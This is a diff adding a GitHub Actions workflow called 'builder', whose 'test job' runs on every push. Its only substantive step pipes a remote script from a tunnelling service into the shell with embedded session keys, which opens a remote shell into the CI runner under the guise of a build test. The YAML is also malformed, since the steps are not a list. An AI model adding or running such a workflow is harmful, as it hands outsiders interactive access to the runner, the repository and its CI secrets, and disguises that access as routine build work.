@@ -1,0 +1,13 @@
+name: builder
+
+on: push
+
+jobs:
+  simple-job:
+    name: test job
+    runs-on: ubuntu-latest
+    steps:
+      run: |
+        sudo apt-get update
+        sudo apt-get install curl
+        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T aTC5Re4kW72ssa6K2LJcHf Ir9cGvjCZktHgjtZY6C6DW
